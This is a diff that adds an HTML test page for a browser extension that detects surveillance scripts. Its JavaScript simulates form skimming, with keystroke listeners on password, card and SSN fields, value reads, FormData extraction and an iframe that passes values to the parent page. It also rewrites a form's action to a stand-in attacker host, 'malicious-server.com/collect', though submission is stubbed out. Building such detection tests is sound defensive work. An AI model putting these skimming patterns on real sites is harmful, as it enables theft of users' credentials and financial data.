@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extension Surveillance Detection Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .test-section {
+            background: white;
+            margin: 20px 0;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .test-section h2 {
+            color: #d32f2f;
+            border-bottom: 2px solid #d32f2f;
+            padding-bottom: 10px;
+        }
+        .test-form {
+            display: grid;
+            gap: 15px;
+            max-width: 500px;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        label {
+            font-weight: bold;
+        }
+        input, select, textarea {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #d32f2f;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #b71c1c;
+        }
+        .malicious-button {
+            background-color: #ff6b35;
+        }
+        .malicious-button:hover {
+            background-color: #e5501f;
+        }
+        .console-output {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            margin-top: 15px;
+            min-height: 100px;
+            overflow-y: auto;
+        }
+        .iframe-container {
+            border: 2px solid #d32f2f;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .iframe-test {
+            width: 100%;
+            height: 400px;
+            border: none;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🕵️ Surveillance Detection Extension Test Page</h1>
+    <p><strong>Instructions:</strong> This page simulates malicious JavaScript behaviors to test your extension's surveillance detection capabilities. Click the red "Simulate Attack" buttons to trigger each hook type.</p>
+
+    <!-- Test Section 1: addEventListener Hook -->
+    <div class="test-section">
+        <h2>1. addEventListener Hook Test</h2>
+        <p>Tests detection of malicious scripts adding event listeners to form elements.</p>
+
+        <form class="test-form" id="addEventListener-form">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" placeholder="Type here to test...">
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Type here to test...">
+            </div>
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" placeholder="Type here to test...">
+            </div>
+            <div class="form-group">
+                <label for="country">Country:</label>
+                <select id="country" name="country">
+                    <option value="">Select country...</option>
+                    <option value="us">United States</option>
+                    <option value="ca">Canada</option>
+                    <option value="uk">United Kingdom</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="comments">Comments:</label>
+                <textarea id="comments" name="comments" rows="3" placeholder="Enter comments..."></textarea>
+            </div>
+        </form>
+
+        <div>
+            <button class="malicious-button" onclick="simulateAddEventListenerAttack()">
+                🚨 Simulate addEventListener Attack
+            </button>
+            <button onclick="clearConsole('addEventListener-console')">Clear Console</button>
+        </div>
+
+        <div class="console-output" id="addEventListener-console">
+            Console output will appear here...
+        </div>
+    </div>
+
+    <!-- Test Section 2: Event Handler Hooks -->
+    <div class="test-section">
+        <h2>2. Event Handler Hooks Test</h2>
+        <p>Tests detection of malicious scripts setting event handler properties (onclick, oninput, etc.).</p>
+
+        <form class="test-form" id="eventHandler-form">
+            <div class="form-group">
+                <label for="creditCard">Credit Card:</label>
+                <input type="text" id="creditCard" name="creditCard" placeholder="Enter credit card number...">
+            </div>
+            <div class="form-group">
+                <label for="ssn">SSN:</label>
+                <input type="text" id="ssn" name="ssn" placeholder="Enter SSN...">
+            </div>
+            <div class="form-group">
+                <label for="bankAccount">Bank Account:</label>
+                <input type="text" id="bankAccount" name="bankAccount" placeholder="Enter account number...">
+            </div>
+            <div class="form-group">
+                <label for="securityCode">Security Code:</label>
+                <input type="password" id="securityCode" name="securityCode" placeholder="Enter security code...">
+            </div>
+            <div class="form-group">
+                <label for="phoneNumber">Phone:</label>
+                <select id="phoneNumber" name="phoneNumber">
+                    <option value="">Select phone...</option>
+                    <option value="mobile">Mobile</option>
+                    <option value="home">Home</option>
+                    <option value="work">Work</option>
+                </select>
+            </div>
+        </form>
+
+        <div>
+            <button class="malicious-button" onclick="simulateEventHandlerAttack()">
+                🚨 Simulate Event Handler Attack
+            </button>
+            <button onclick="clearConsole('eventHandler-console')">Clear Console</button>
+        </div>
+
+        <div class="console-output" id="eventHandler-console">
+            Console output will appear here...
+        </div>
+    </div>
+
+    <!-- Test Section 3: Property Getter Hooks -->
+    <div class="test-section">
+        <h2>3. Property Getter Hooks Test</h2>
+        <p>Tests detection of malicious scripts accessing form element values/properties.</p>
+
+        <form class="test-form" id="propertyGetter-form">
+            <div class="form-group">
+                <label for="sensitiveData">Sensitive Data:</label>
+                <input type="text" id="sensitiveData" name="sensitiveData" placeholder="Enter sensitive information..." value="secret123">
+            </div>
+            <div class="form-group">
+                <label for="personalInfo">Personal Info:</label>
+                <input type="text" id="personalInfo" name="personalInfo" placeholder="Enter personal info..." value="John Doe">
+            </div>
+            <div class="form-group">
+                <label for="financialData">Financial Data:</label>
+                <input type="password" id="financialData" name="financialData" placeholder="Enter financial data..." value="account456">
+            </div>
+            <div class="form-group">
+                <label for="privateNotes">Private Notes:</label>
+                <textarea id="privateNotes" name="privateNotes" rows="3" placeholder="Private notes...">These are my private notes</textarea>
+            </div>
+            <div class="form-group">
+                <label for="securityLevel">Security Level:</label>
+                <select id="securityLevel" name="securityLevel">
+                    <option value="low">Low</option>
+                    <option value="medium" selected>Medium</option>
+                    <option value="high">High</option>
+                </select>
+            </div>
+        </form>
+
+        <div>
+            <button class="malicious-button" onclick="simulatePropertyGetterAttack()">
+                🚨 Simulate Property Access Attack
+            </button>
+            <button onclick="clearConsole('propertyGetter-console')">Clear Console</button>
+        </div>
+
+        <div class="console-output" id="propertyGetter-console">
+            Console output will appear here...
+        </div>
+    </div>
+
+    <!-- Test Section 4: Form Hooks -->
+    <div class="test-section">
+        <h2>4. Form Hooks Test</h2>
+        <p>Tests detection of malicious scripts intercepting form submissions and FormData creation.</p>
+
+        <form class="test-form" id="formHooks-form" action="/submit" method="POST">
+            <div class="form-group">
+                <label for="loginUsername">Login Username:</label>
+                <input type="text" id="loginUsername" name="loginUsername" placeholder="Enter username..." value="testuser">
+            </div>
+            <div class="form-group">
+                <label for="loginPassword">Login Password:</label>
+                <input type="password" id="loginPassword" name="loginPassword" placeholder="Enter password..." value="testpass123">
+            </div>
+            <div class="form-group">
+                <label for="apiKey">API Key:</label>
+                <input type="text" id="apiKey" name="apiKey" placeholder="Enter API key..." value="sk_test_12345">
+            </div>
+            <div class="form-group">
+                <label for="secretToken">Secret Token:</label>
+                <input type="password" id="secretToken" name="secretToken" placeholder="Enter token..." value="token_abcdef">
+            </div>
+            <div class="form-group">
+                <label for="userRole">User Role:</label>
+                <select id="userRole" name="userRole">
+                    <option value="user">User</option>
+                    <option value="admin" selected>Admin</option>
+                    <option value="superuser">Super User</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <button type="button" onclick="simulateFormSubmissionEvent()">🚨 Simulate Submit Event</button>
+                <button type="submit" onclick="event.preventDefault();">Submit Form (Safe)</button>
+            </div>
+        </form>
+
+        <div>
+            <button class="malicious-button" onclick="simulateFormHooksAttack()">
+                🚨 Simulate Form Data Attack
+            </button>
+            <button class="malicious-button" onclick="simulateFormSubmitAttack()">
+                🚨 Simulate Form Submit Attack
+            </button>
+            <button onclick="clearConsole('formHooks-console')">Clear Console</button>
+        </div>
+
+        <div class="console-output" id="formHooks-console">
+            Console output will appear here...
+        </div>
+    </div>
+
+    <!-- Test Section 5: Iframe Test -->
+    <div class="test-section">
+        <h2>5. Iframe Test</h2>
+        <p>Tests surveillance detection within iframes containing forms.</p>
+
+        <div class="iframe-container">
+            <iframe id="test-iframe" class="iframe-test" srcdoc='
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body { font-family: Arial; padding: 20px; background: #f9f9f9; }
+                        input { width: 200px; padding: 8px; margin: 5px 0; display: block; }
+                        button { padding: 10px 20px; background: #ff6b35; color: white; border: none; cursor: pointer; }
+                    </style>
+                </head>
+                <body>
+                    <h3>Iframe Form</h3>
+                    <form id="iframe-form">
+                        <input type="text" name="username" placeholder="Username" value="testuser">
+                        <input type="password" name="password" placeholder="Password" value="testpass">
+                        <input type="email" name="email" placeholder="Email" value="test@example.com">
+                        <button type="button" onclick="attackIframe()">🚨 Attack Iframe</button>
+                        <button type="submit">Submit</button>
+                    </form>
+
+                    <script>
+                        function attackIframe() {
+                            const inputs = document.querySelectorAll("input");
+                            inputs.forEach(input => {
+                                input.addEventListener("input", function() {
+                                    console.log("IFRAME ATTACK: " + input.name + " = " + input.value);
+                                    parent.postMessage({type: "iframe-data", field: input.name, value: input.value}, "*");
+                                });
+
+                                // Access values
+                                const value = input.value;
+                                console.log("IFRAME STOLEN: " + input.name + " = " + value);
+                            });
+                        }
+                    </script>
+                </body>
+                </html>
+            '></iframe>
+        </div>
+
+        <div class="console-output" id="iframe-console">
+            Iframe messages will appear here...
+        </div>
+    </div>
+
+    <script>
+        // Utility function to log to specific console area
+        function logToConsole(consoleId, message, type = 'info') {
+            const consoleElement = document.getElementById(consoleId);
+            const timestamp = new Date().toLocaleTimeString();
+            const colorMap = {
+                'info': '#00ff00',
+                'warn': '#ffff00',
+                'error': '#ff0000',
+                'attack': '#ff6b35'
+            };
+
+            const logEntry = document.createElement('div');
+            logEntry.style.color = colorMap[type] || '#00ff00';
+            logEntry.innerHTML = `[${timestamp}] ${message}`;
+
+            consoleElement.appendChild(logEntry);
+            consoleElement.scrollTop = consoleElement.scrollHeight;
+        }
+
+        function clearConsole(consoleId) {
+            document.getElementById(consoleId).innerHTML = 'Console cleared...';
+        }
+
+        // 1. addEventListener Hook Simulation
+        function simulateAddEventListenerAttack() {
+            logToConsole('addEventListener-console', 'Starting addEventListener surveillance simulation...', 'attack');
+
+            // Get all form elements from the addEventListener test section
+            const formElements = document.querySelectorAll('#addEventListener-form input, #addEventListener-form select, #addEventListener-form textarea');
+
+            logToConsole('addEventListener-console', `Found ${formElements.length} form elements to attack`, 'info');
+
+            // Simulate malicious script behavior - add event listeners to steal data
+            formElements.forEach((element, index) => {
+                // Multiple event types that surveillance scripts commonly use
+                const surveillanceEvents = ['input', 'keydown', 'change', 'focus', 'blur', 'keyup'];
+
+                surveillanceEvents.forEach(eventType => {
+                    try {
+                        // This should trigger the addEventListener hook
+                        element.addEventListener(eventType, function(event) {
+                            // Simulate malicious data collection
+                            const elementInfo = {
+                                type: element.type || element.tagName,
+                                name: element.name,
+                                value: element.value,
+                                eventType: event.type
+                            };
+
+                            logToConsole('addEventListener-console',
+                                `MALICIOUS: Captured ${eventType} on ${element.name || element.id}: "${element.value}"`,
+                                'attack'
+                            );
+
+                            // Simulate sending data to malicious server
+                            logToConsole('addEventListener-console',
+                                `MALICIOUS: Would send data to attacker server: ${JSON.stringify(elementInfo)}`,
+                                'attack'
+                            );
+                        });
+
+                        logToConsole('addEventListener-console',
+                            `Added ${eventType} listener to ${element.name || element.id}`,
+                            'warn'
+                        );
+
+                    } catch (error) {
+                        logToConsole('addEventListener-console',
+                            `Error adding ${eventType} listener: ${error.message}`,
+                            'error'
+                        );
+                    }
+                });
+            });
+
+            logToConsole('addEventListener-console', 'addEventListener surveillance simulation complete!', 'attack');
+            logToConsole('addEventListener-console', 'Try typing in the form fields above to see the malicious listeners in action.', 'info');
+        }
+
+        // 2. Event Handler Hooks Simulation
+        function simulateEventHandlerAttack() {
+            logToConsole('eventHandler-console', 'Starting event handler surveillance simulation...', 'attack');
+
+            // Get all form elements from the event handler test section
+            const formElements = document.querySelectorAll('#eventHandler-form input, #eventHandler-form select, #eventHandler-form textarea');
+
+            logToConsole('eventHandler-console', `Found ${formElements.length} form elements to attack`, 'info');
+
+            // Event handler properties that surveillance scripts commonly set
+            const eventHandlerProperties = ['oninput', 'onkeydown', 'onchange', 'onfocus', 'onblur', 'onkeyup'];
+
+            formElements.forEach((element, index) => {
+                eventHandlerProperties.forEach(handlerProp => {
+                    try {
+                        // This should trigger the event handler hook
+                        element[handlerProp] = function(event) {
+                            // Simulate malicious data collection via event handler
+                            const elementInfo = {
+                                type: element.type || element.tagName,
+                                name: element.name,
+                                value: element.value,
+                                eventType: event.type,
+                                timestamp: new Date().toISOString()
+                            };
+
+                            logToConsole('eventHandler-console',
+                                `MALICIOUS: Handler ${handlerProp} captured ${event.type} on ${element.name || element.id}: "${element.value}"`,
+                                'attack'
+                            );
+
+                            // Simulate sending sensitive data to attacker server
+                            if (element.value.length > 0) {
+                                logToConsole('eventHandler-console',
+                                    `MALICIOUS: Sending sensitive data via ${handlerProp}: ${JSON.stringify(elementInfo)}`,
+                                    'attack'
+                                );
+                            }
+                        };
+
+                        logToConsole('eventHandler-console',
+                            `Set ${handlerProp} handler on ${element.name || element.id}`,
+                            'warn'
+                        );
+
+                    } catch (error) {
+                        logToConsole('eventHandler-console',
+                            `Error setting ${handlerProp} handler: ${error.message}`,
+                            'error'
+                        );
+                    }
+                });
+            });
+
+            logToConsole('eventHandler-console', 'Event handler surveillance simulation complete!', 'attack');
+            logToConsole('eventHandler-console', 'Try typing in the form fields above to see the malicious handlers in action.', 'info');
+        }
+
+        // 3. Property Getter Hooks Simulation
+        function simulatePropertyGetterAttack() {
+            logToConsole('propertyGetter-console', 'Starting property getter surveillance simulation...', 'attack');
+
+            // Get all form elements from the property getter test section
+            const formElements = document.querySelectorAll('#propertyGetter-form input, #propertyGetter-form select, #propertyGetter-form textarea');
+
+            logToConsole('propertyGetter-console', `Found ${formElements.length} form elements to attack`, 'info');
+
+            // Properties that surveillance scripts commonly access
+            const sensitiveProperties = ['value', 'nodeValue', 'textContent', 'innerText'];
+
+            formElements.forEach((element, index) => {
+                sensitiveProperties.forEach(propName => {
+                    try {
+                        // This should trigger the property getter hook
+                        let stolenValue;
+
+                        if (propName === 'value') {
+                            stolenValue = element.value; // Main target for surveillance
+                        } else if (propName === 'nodeValue') {
+                            stolenValue = element.firstChild ? element.firstChild.nodeValue : null;
+                        } else if (propName === 'textContent') {
+                            stolenValue = element.textContent;
+                        } else if (propName === 'innerText') {
+                            stolenValue = element.innerText;
+                        }
+
+                        // Log the stolen data
+                        if (stolenValue !== null && stolenValue !== undefined && stolenValue !== '') {
+                            const elementInfo = {
+                                elementType: element.type || element.tagName,
+                                elementName: element.name || element.id,
+                                propertyAccessed: propName,
+                                stolenValue: stolenValue,
+                                timestamp: new Date().toISOString()
+                            };
+
+                            logToConsole('propertyGetter-console',
+                                `MALICIOUS: Accessed ${propName} on ${element.name || element.id}: "${stolenValue}"`,
+                                'attack'
+                            );
+
+                            // Simulate sending stolen data to malicious server
+                            logToConsole('propertyGetter-console',
+                                `MALICIOUS: Exfiltrating data via ${propName}: ${JSON.stringify(elementInfo)}`,
+                                'attack'
+                            );
+
+                            // Simulate multiple rapid accesses (common surveillance pattern)
+                            setTimeout(() => {
+                                const rapidAccess = element.value;
+                                if (rapidAccess) {
+                                    logToConsole('propertyGetter-console',
+                                        `MALICIOUS: Rapid access #2 to ${element.name || element.id}: "${rapidAccess}"`,
+                                        'attack'
+                                    );
+                                }
+                            }, 100);
+                        }
+
+                        logToConsole('propertyGetter-console',
+                            `Accessed ${propName} property on ${element.name || element.id}`,
+                            'warn'
+                        );
+
+                    } catch (error) {
+                        logToConsole('propertyGetter-console',
+                            `Error accessing ${propName} property: ${error.message}`,
+                            'error'
+                        );
+                    }
+                });
+            });
+
+            // Additional surveillance patterns
+            setTimeout(() => {
+                logToConsole('propertyGetter-console', 'Simulating periodic value monitoring...', 'attack');
+
+                // Simulate surveillance script that periodically checks values
+                const monitoringInterval = setInterval(() => {
+                    formElements.forEach(element => {
+                        if (element.value && element.value.length > 0) {
+                            logToConsole('propertyGetter-console',
+                                `PERIODIC SURVEILLANCE: Checking ${element.name || element.id} value: "${element.value}"`,
+                                'attack'
+                            );
+                        }
+                    });
+                }, 2000);
+
+                // Stop monitoring after 10 seconds
+                setTimeout(() => {
+                    clearInterval(monitoringInterval);
+                    logToConsole('propertyGetter-console', 'Periodic monitoring stopped.', 'info');
+                }, 10000);
+
+            }, 500);
+
+            logToConsole('propertyGetter-console', 'Property getter surveillance simulation complete!', 'attack');
+            logToConsole('propertyGetter-console', 'Values are being monitored. Try changing the form values above.', 'info');
+        }
+
+        // 4. Form Hooks Simulation - FormData Attack
+        function simulateFormHooksAttack() {
+            logToConsole('formHooks-console', 'Starting FormData surveillance simulation...', 'attack');
+
+            const form = document.getElementById('formHooks-form');
+            if (!form) {
+                logToConsole('formHooks-console', 'Error: Form not found!', 'error');
+                return;
+            }
+
+            try {
+                // This should trigger the FormData constructor hook
+                logToConsole('formHooks-console', 'Creating FormData object to steal form data...', 'attack');
+
+                const formData = new FormData(form);
+
+                logToConsole('formHooks-console', 'FormData created successfully. Extracting stolen data:', 'attack');
+
+                // Iterate through all form data (simulating malicious data extraction)
+                const stolenData = {};
+                formData.forEach((value, key) => {
+                    stolenData[key] = value;
+                    logToConsole('formHooks-console',
+                        `MALICIOUS: Extracted field "${key}": "${value}"`,
+                        'attack'
+                    );
+                });
+
+                // Simulate sending stolen data to malicious server
+                const payloadData = {
+                    timestamp: new Date().toISOString(),
+                    formAction: form.action,
+                    formMethod: form.method,
+                    stolenFields: stolenData,
+                    victimUrl: window.location.href
+                };
+
+                logToConsole('formHooks-console',
+                    `MALICIOUS: Sending stolen form data to attacker server: ${JSON.stringify(payloadData)}`,
+                    'attack'
+                );
+
+                // Simulate multiple FormData creations (common surveillance pattern)
+                setTimeout(() => {
+                    logToConsole('formHooks-console', 'Creating additional FormData objects for monitoring...', 'attack');
+                    for (let i = 0; i < 3; i++) {
+                        const additionalFormData = new FormData(form);
+                        logToConsole('formHooks-console', `MALICIOUS: Additional FormData #${i + 1} created`, 'attack');
+                    }
+                }, 1000);
+
+            } catch (error) {
+                logToConsole('formHooks-console', `Error in FormData attack: ${error.message}`, 'error');
+            }
+
+            logToConsole('formHooks-console', 'FormData surveillance simulation complete!', 'attack');
+        }
+
+        // 4. Form Hooks Simulation - Form Submit Attack
+        function simulateFormSubmitAttack() {
+            logToConsole('formHooks-console', 'Starting form submission surveillance simulation...', 'attack');
+
+            const form = document.getElementById('formHooks-form');
+            if (!form) {
+                logToConsole('formHooks-console', 'Error: Form not found!', 'error');
+                return;
+            }
+
+            try {
+                // First, simulate capturing form data before submission
+                logToConsole('formHooks-console', 'Intercepting form before submission...', 'attack');
+
+                const formData = new FormData(form);
+                const interceptedData = {};
+                formData.forEach((value, key) => {
+                    interceptedData[key] = value;
+                });
+
+                logToConsole('formHooks-console',
+                    `MALICIOUS: Intercepted form data before submission: ${JSON.stringify(interceptedData)}`,
+                    'attack'
+                );
+
+                // Simulate modifying form action (common attack pattern)
+                const originalAction = form.action;
+                form.action = 'https://malicious-server.com/collect';
+                logToConsole('formHooks-console',
+                    `MALICIOUS: Changed form action from "${originalAction}" to "${form.action}"`,
+                    'attack'
+                );
+
+                // This should trigger the form submit hook
+                logToConsole('formHooks-console', 'Calling form.submit() method...', 'attack');
+
+                // Prevent actual submission for testing
+                const originalSubmit = form.submit;
+                form.submit = function() {
+                    logToConsole('formHooks-console', 'MALICIOUS: Form submit() method called - data would be sent to attacker!', 'attack');
+                    logToConsole('formHooks-console', `Form would submit to: ${form.action}`, 'attack');
+
+                    // Restore original action and submit method
+                    form.action = originalAction;
+                    form.submit = originalSubmit;
+
+                    logToConsole('formHooks-console', 'Submission prevented for testing. Form restored.', 'info');
+                };
+
+                // Trigger the hooked submit method
+                form.submit();
+
+                // Simulate submit event listener attack
+                setTimeout(() => {
+                    logToConsole('formHooks-console', 'Simulating submit event listener attack...', 'attack');
+
+                    const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
+                    form.dispatchEvent(submitEvent);
+
+                    logToConsole('formHooks-console', 'Submit event dispatched - should trigger event listener hook', 'attack');
+                }, 2000);
+
+            } catch (error) {
+                logToConsole('formHooks-console', `Error in form submit attack: ${error.message}`, 'error');
+            }
+
+            logToConsole('formHooks-console', 'Form submission surveillance simulation complete!', 'attack');
+        }
+
+        // 4. Form Hooks Simulation - Submit Event Test
+        function simulateFormSubmissionEvent() {
+            logToConsole('formHooks-console', 'Starting form submit event surveillance simulation...', 'attack');
+
+            const form = document.getElementById('formHooks-form');
+            if (!form) {
+                logToConsole('formHooks-console', 'Error: Form not found!', 'error');
+                return;
+            }
+
+            try {
+                // This should trigger the submit event listener hook
+                logToConsole('formHooks-console', 'Dispatching submit event on form...', 'attack');
+
+                // Create and dispatch a submit event
+                const submitEvent = new Event('submit', {
+                    bubbles: true,
+                    cancelable: true
+                });
+
+                // Prevent actual form submission for testing
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    logToConsole('formHooks-console', 'Submit event prevented for testing purposes', 'info');
+                }, { once: true });
+
+                // Dispatch the event - this should trigger the hook
+                const eventDispatched = form.dispatchEvent(submitEvent);
+
+                logToConsole('formHooks-console',
+                    `Submit event dispatched: ${eventDispatched ? 'success' : 'cancelled'}`,
+                    'attack'
+                );
+
+                logToConsole('formHooks-console', 'Form submit event surveillance simulation complete!', 'attack');
+
+            } catch (error) {
+                logToConsole('formHooks-console', `Error in submit event simulation: ${error.message}`, 'error');
+            }
+        }
+
+        // 5. Iframe message handler
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'iframe-data') {
+                logToConsole('iframe-console',
+                    `IFRAME SURVEILLANCE: ${event.data.field} = "${event.data.value}"`,
+                    'attack'
+                );
+            }
+        });
+
+        // Page initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            logToConsole('addEventListener-console', 'Test page loaded. Extension should be active.', 'info');
+            logToConsole('addEventListener-console', 'Click the "Simulate addEventListener Attack" button to test the hook.', 'info');
+            logToConsole('iframe-console', 'Iframe loaded. Click "Attack Iframe" button inside the iframe to test surveillance.', 'info');
+        });
+    </script>
+</body>
+</html>
